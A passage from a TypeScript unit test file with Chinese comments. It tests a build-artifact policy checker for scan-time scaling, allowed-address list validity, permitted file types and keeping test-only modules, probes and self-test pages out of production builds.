      expect(scan(content, path).violations).toEqual([])
      const used = process.threadCpuUsage(start)
      return (used.user + used.system) / 1000
    }
    once(build(1000))
    // 大小两种数量交替测，各取五次里最快的一次：两者经历同样的负载，比值不受机器忙闲的影响（原来先后分开测、
    // 数量乘 4、上限 10，整套单元测试并行跑时线性的扫描也偶发超过 10，第二轮复验）
    const [small, large] = [build(2_000), build(32_000)]
    const times = { small: [] as number[], large: [] as number[] }
    for (let round = 0; round < 5; round++) {
      times.small.push(once(small))
      times.large.push(once(large))
    }
    // 数量乘 16：线性约 16 倍，平方级约 256 倍，上限取两者的几何平均 64，两边各留 4 倍的余量。
    // 原来乘 8、上限 24，只有约 2.8 倍的余量：整套测试开着覆盖率并行跑时，线性的扫描实测到 26 倍（单独跑 7.7–8.5 倍，
    // 负载放大约 3.1 倍），M2-P1 收尾时偶发失败。乘 16 也让"平方项刚开始起作用"的情形更容易被发现
    expect(Math.min(...times.large) / Math.max(Math.min(...times.small), 1)).toBeLessThan(64)
    // 计时的用例，时限只用来发现卡住。M2-P1 把规模从 32k 翻到 64k 时没有动时限：四条之中最慢的 SVG 样式与全部单元测试一起跑 4.3 秒、
    // 覆盖率那一轮 9.4 秒。M2-P6 第 6 片复核 G3 把规模减半回 2k/32k（倍数与上限不变），实测四条最慢的：本机单独 0.8 秒、
    // 与全部单元测试一起跑 1.3 秒、覆盖率那一轮 2.7 秒。CI 的 tests 一步约是本机的 3.2 倍（估计 9 秒左右），60 秒有六倍余量
  }, 60_000)

  it('真实的允许清单：每一项都是合法的绝对地址，写明来源与用途，没有重复；前缀至少写到路径的第一段', () => {
    const { allowedAddresses } = ARTIFACT_POLICY
    for (const entry of allowedAddresses) {
      expect(() => new URL(entry.address), entry.address).not.toThrow()
      expect(entry.source.length > 0 && entry.reason.length > 0, entry.address).toBe(true)
      if (entry.prefix === true)
        expect(new URL(entry.address).pathname.length, entry.address).toBeGreaterThan(1)
    }
    expect(new Set(allowedAddresses.map(entry => entry.address.toLowerCase())).size).toBe(allowedAddresses.length)
  })
})

describe('US-M1-11 A01 产物的文件类型', () => {
  it('合规：已登记的类型与三个清单文件', () => {
    expect(checkFileTypes(['index.html', 'assets/index-a.js', 'assets/x.css', 'assets/f.woff2', 'assets/logo.svg', 'config.json', 'THIRD-PARTY-LICENSES.md', '.vite/manifest.json', '.vite/third-party-packages.json'])).toEqual([])
  })

  it.each(['assets/x.wasm', 'assets/app.js.map', 'assets/data.bin', 'README', 'notes.md', 'docs/THIRD-PARTY-LICENSES.md'])('违规：未登记的类型或位置 %s', (path) => {
    expect(checkFileTypes([path]).map(v => v.rule)).toEqual(['artifacts/file-type'])
  })

  it('清单文件不扫描内容，其他 .json 按文本扫描', () => {
    expect(classifyArtifact('THIRD-PARTY-LICENSES.md')).toBe('metadata')
    expect(classifyArtifact('.vite/manifest.json')).toBe('metadata')
    expect(classifyArtifact('.vite/module-sources.json')).toBe('metadata')
    expect(classifyArtifact('config.json')).toBe('text')
  })
})

describe('US-M1-09 生产构建里没有测试构建的模块：按来源认（M3-P2 复核 B2）', () => {
  it('测试专用的来源：编辑器的 testing/、自检与 CSP 探针的入口页与脚本、编辑器页的挂接（查询串不算）；名字相近的、生产的源码、第三方包里同名的目录都不算', () => {
    const testOnly = ['src/editor/testing/switch-timing.ts', 'src/editor/testing/read-only-entries.ts', 'src/editor/testing/content-compare.ts?raw', 'selftest.html', 'csp-probe.html', 'src/entries/selftest/sign-in.ts', 'src/entries/csp-probe/probe-worker.ts', 'src/features/sheet-editor/selftest-hook.ts']
    for (const module of testOnly)
      expect(isTestOnlySource(module), module).toBe(true)
    const production = ['src/editor/testing-utils/x.ts', 'src/editor/sheet-editor.ts', 'src/features/sheet-editor/selftest-hook-like.ts', 'index.html', 'editor.html', 'src/entries/editor/main.ts', 'node_modules/some-lib/src/editor/testing/x.js', '../../packages/contracts/src/index.ts', 'virtual:rolldown/runtime.js']
    for (const module of production)
      expect(isTestOnlySource(module), module).toBe(false)
  })

  it('脚本里有测试专用的模块即违规——分块名看不出来也认得出（被生产代码直接动态引入、改了名、并进了入口块），说明里列出那几个模块', () => {
    const violations = checkTestOnlySources({
      'assets/index-a.js': { name: 'index', modules: ['index.html', 'src/entries/platform/main.ts'] },
      'assets/timing-b.js': { name: 'timing', modules: ['src/editor/testing/switch-timing.ts'] },
      'assets/editor-c.js': { name: 'editor', modules: ['editor.html', 'src/editor/sheet-editor.ts', 'src/editor/testing/read-only-entries.ts', 'src/editor/testing/content-compare.ts'] },
    }, ['index.html', 'assets/index-a.js', 'assets/timing-b.js', 'assets/editor-c.js'])
    expect(violations.map(v => [v.rule, v.subject])).toEqual([['artifacts/test-only-source', 'assets/timing-b.js'], ['artifacts/test-only-source', 'assets/editor-c.js']])
    expect(violations[1]?.detail).toContain('src/editor/testing/read-only-entries.ts、src/editor/testing/content-compare.ts')
  })

  it('产物里的每个脚本（.js、.mjs）都要在清单里：不在的按来源看不到，即违规；别的文件不管', () => {
    const violations = checkTestOnlySources({ 'assets/index-a.js': { name: 'index', modules: ['index.html'] } }, ['index.html', 'assets/index-a.js', 'assets/extra-b.js', 'assets/worker-c.mjs', 'assets/x.css', '.vite/module-sources.json'])
    expect(violations.map(v => [v.rule, v.subject])).toEqual([['artifacts/unlisted-script', 'assets/extra-b.js'], ['artifacts/unlisted-script', 'assets/worker-c.mjs']])
  })

  it('名字的兜底：与 E2E 共用的文件被单独动态引入时自成的分块（入口清单、比较口径、切换的计时、捕获时机的样本与参考规则）同样按名字认', () => {
    expect(checkTestOnlyArtifacts(['assets/switch-timing-BFKYlR0-.js', 'assets/read-only-entries-x.js', 'assets/content-compare-y.js', 'assets/timing-z.js', 'assets/capture-samples-a.js', 'assets/capture-reference-b.js', 'assets/capture-c.js']).map(v => v.subject))
      .toEqual(['assets/switch-timing-BFKYlR0-.js', 'assets/read-only-entries-x.js', 'assets/content-compare-y.js', 'assets/capture-samples-a.js', 'assets/capture-reference-b.js'])
  })

  it('M3-P4：公式模式的开关（测试构建里地址参数选主线程模式）按来源与分块名都认得出；生产的公式档案不算', () => {
    expect(isTestOnlySource('src/editor/testing/formula-mode.ts')).toBe(true)
    expect(isTestOnlySource('src/editor/profile/sheet-profile.ts')).toBe(false)
    expect(checkTestOnlyArtifacts(['assets/formula-mode-Dx1.js', 'assets/formula-D2.js', 'assets/my-formula-mode-x.js']).map(v => v.subject)).toEqual(['assets/formula-mode-Dx1.js'])
  })
})

describe('US-M1-09 生产构建里没有测试构建的文件', () => {
  it('CSP 探针的页面与 Worker 出现在生产构建里即违规', () => {
    expect(checkTestOnlyArtifacts(['index.html', 'assets/index-abc.js']).map(v => v.subject)).toEqual([])
    expect(checkTestOnlyArtifacts(['csp-probe.html', 'assets/csp-probe-B7Lc.js', 'assets/probe-worker-CtLd.js', 'assets/index-abc.js']).map(v => v.subject))
      .toEqual(['csp-probe.html', 'assets/csp-probe-B7Lc.js', 'assets/probe-worker-CtLd.js'])
  })

  it('编辑器的 E2E 探针的分块出现在生产构建里即违规（M2-P3 设计 §3.7）；名字相近的其他文件不算', () => {
    const violations = checkTestOnlyArtifacts(['editor.html', 'assets/editor-BcxC.js', 'assets/e2e-probe-CC7cG7BE.js', 'assets/my-e2e-probe-x.js', 'assets/e2e-probes.js'])
    expect(violations.map(v => v.subject)).toEqual(['assets/e2e-probe-CC7cG7BE.js'])
    expect(violations[0]?.detail).toContain('E2E 探针')
  })

  it('探针补上的插件 Facade 单独成块出现在生产构建里同样违规（M2-P6 第 4 片复核 F5）：它没有探针的名字，只能按分块名认', () => {
    const violations = checkTestOnlyArtifacts(['editor.html', 'assets/probe-facades-Dk3x.js', 'assets/facades-Dk3x.js', 'assets/my-probe-facades-x.js'])
    expect(violations.map(v => v.subject)).toEqual(['assets/probe-facades-Dk3x.js'])
  })

  it('页面自检（M3-P2 设计 §3.5）的入口页与分块（入口页的脚本、编辑器页的挂接、自检模块、结果的格式）出现在生产构建里即违规；名字相近的不算', () => {
    const violations = checkTestOnlyArtifacts([
      'selftest.html',
      'assets/selftest-CgaJxJD_.js',
      'assets/selftest-hook-k7BaCYdU.js',
      'assets/selftest-report-BHKLWSt-.js',
      'selftests.html',
      'assets/my-selftest-x.js',
      'assets/selftests.js',
      'assets/editor-BcxC.js',
    ])
    expect(violations.map(v => v.subject)).toEqual(['selftest.html', 'assets/selftest-CgaJxJD_.js', 'assets/selftest-hook-k7BaCYdU.js', 'assets/selftest-report-BHKLWSt-.js'])
    expect(violations[0]?.detail).toContain('页面自检')
  })
})
